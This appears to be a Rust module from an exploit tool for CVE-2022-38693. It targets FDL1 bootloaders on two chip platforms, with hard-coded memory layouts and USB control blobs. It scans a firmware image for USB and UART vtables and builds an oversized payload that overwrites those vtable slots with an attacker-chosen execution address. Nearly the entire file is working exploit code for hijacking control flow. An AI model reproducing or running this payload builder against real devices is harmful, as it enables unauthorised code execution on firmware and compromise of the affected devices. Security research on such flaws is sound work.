//! FDL1 payload hijacking and vtable scanning for CVE-2022-38693 matching common.c.

pub struct Fdl1Layout {
    pub name: &'static str,
    pub pkt0_dst: u32,
    pub img_base: u32,
    pub usb_ctrl_addr: u32,
    pub exec_entry: u64,
    pub usb_ctrl: &'static [u8],
}

pub const FDL1_USB_CTRL_9360: [u8; 96] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x80, 0x68, 0x00, 0x65, 0x20, 0x00, 0x00, 0x10, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x14, 0xff, 0x8e, 0x80, 0x20, 0x00, 0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x80, 0x68, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x20, 0x00, 0x06, 0x01, 0x00, 0x01,
    0x14, 0xff, 0x8e, 0x80, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x20, 0x00, 0x05, 0x01, 0x00, 0x01,
];

pub const FDL1_USB_CTRL_9632: [u8; 96] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x80, 0x44, 0x00, 0x65, 0x20, 0x00, 0x00, 0x10, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x14, 0xff, 0x8e, 0x80, 0x20, 0x00, 0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x80, 0x44, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x20, 0x00, 0x06, 0x01, 0x00, 0x01,
    0x14, 0xff, 0x8e, 0x80, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x20, 0x00, 0x05, 0x01, 0x00, 0x01,
];

pub const FDL1_LAYOUTS: [Fdl1Layout; 2] = [
    Fdl1Layout {
        name: "9360",
        pkt0_dst: 0x6500339C,
        img_base: 0x65008000,
        usb_ctrl_addr: 0x65005BC0,
        exec_entry: 0xBE000000,
        usb_ctrl: &FDL1_USB_CTRL_9360,
    },
    Fdl1Layout {
        name: "9632",
        pkt0_dst: 0x65000F9C,
        img_base: 0x65008000,
        usb_ctrl_addr: 0x650037C0,
        exec_entry: 0xBE000000,
        usb_ctrl: &FDL1_USB_CTRL_9632,
    },
];

pub fn find_usb_table(img: &[u8], img_base: u32) -> Option<u32> {
    let anchor = b"ROMCODE";
    let alen = anchor.len();
    let size = img.len().min(0x1B800);
    let mut i = 0;
    while i + alen <= size {
        if &img[i..i + alen] == anchor {
            let mut p = i.saturating_sub(8);
            while p >= 8 {
                let v = u32::from_le_bytes(img[p - 8..p - 4].try_into().unwrap());
                let hi = u32::from_le_bytes(img[p - 4..p].try_into().unwrap());
                if hi != 0 || v < img_base || v >= img_base + (size as u32) {
                    break;
                }
                p -= 8;
            }
            let tbl_out = img_base + (p as u32);
            eprintln!("pwnexec: usb vtable 0x{:x}", tbl_out);
            return Some(tbl_out);
        }
        i += 8;
    }
    None
}

fn is_ptrtab(img: &[u8], size: usize, img_base: u32, off: usize, n: usize) -> bool {
    for i in 0..n {
        let entry_off = off + i * 8;
        if entry_off + 8 > size {
            return false;
        }
        let v = u32::from_le_bytes(img[entry_off..entry_off + 4].try_into().unwrap());
        let hi = u32::from_le_bytes(img[entry_off + 4..entry_off + 8].try_into().unwrap());
        if hi != 0 || v < img_base || v >= img_base + (size as u32) {
            return false;
        }
    }
    true
}

pub fn find_uart_tables(img: &[u8], img_base: u32, usb_first: u32, max_out: usize) -> Vec<u32> {
    let size = img.len().min(0x1B800);
    let mut out = Vec::new();
    let mut off = 0;
    while off + 0x40 <= size && out.len() + 2 <= max_out {
        if is_ptrtab(img, size, img_base, off, 8)
            && !(off >= 8 && is_ptrtab(img, size, img_base, off - 8, 8))
        {
            let first = u32::from_le_bytes(img[off..off + 4].try_into().unwrap());
            if first < usb_first {
                let mut off2 = off + 8;
                let mut found = false;
                while off2 + 0x40 <= size {
                    if img[off..off + 0x40] == img[off2..off2 + 0x40] {
                        found = true;
                        break;
                    }
                    off2 += 8;
                }
                if found {
                    let t1 = img_base + (off as u32);
                    let t2 = img_base + (off2 as u32);
                    eprintln!("pwnexec: uart vtable 0x{:x} (twin 0x{:x})", t1, t2);
                    out.push(t1);
                    out.push(t2);
                }
            }
        }
        off += 8;
    }
    out
}

/// Builds the hijacked payload for CVE-2022-38693.
/// Returns (payload_bytes, dst_addr, img_addr).
pub fn build_hijack_payload(
    img: &[u8],
    platform: &str,
) -> Result<(Vec<u8>, u32, u32), &'static str> {
    let layout = FDL1_LAYOUTS
        .iter()
        .find(|l| l.name == platform)
        .ok_or("unknown platform")?;
    let dst_addr = layout.pkt0_dst;
    let img_addr = layout.img_base;
    let hijack_val = layout.exec_entry;

    let usb_tbl = find_usb_table(img, img_addr).ok_or("no ROMCODE anchor")?;
    let usb_first = u32::from_le_bytes(
        img[(usb_tbl - img_addr) as usize..(usb_tbl - img_addr + 4) as usize]
            .try_into()
            .unwrap(),
    );

    let mut patch_at = Vec::new();
    patch_at.push(usb_tbl + 8);
    let uart_tbls = find_uart_tables(img, img_addr, usb_first, 4);
    for u in uart_tbls {
        if patch_at.len() < 10 {
            patch_at.push(u + 0x18);
        }
    }
    eprintln!("pwnexec: {} hijack slot(s) will be patched", patch_at.len());

    let total_len = ((img_addr - dst_addr) as usize) + 0x1B800;
    let mut payload = vec![0u8; total_len];
    let keep = img.len().min(0x1B800);
    payload[((img_addr - dst_addr) as usize)..((img_addr - dst_addr) as usize) + keep]
        .copy_from_slice(&img[..keep]);

    let off_usb = (layout.usb_ctrl_addr - dst_addr) as usize;
    payload[off_usb..off_usb + layout.usb_ctrl.len()].copy_from_slice(layout.usb_ctrl);

    for &patch in &patch_at {
        let off = (patch - dst_addr) as usize;
        payload[off..off + 8].copy_from_slice(&hijack_val.to_le_bytes());
    }

    Ok((payload, dst_addr, img_addr))
}
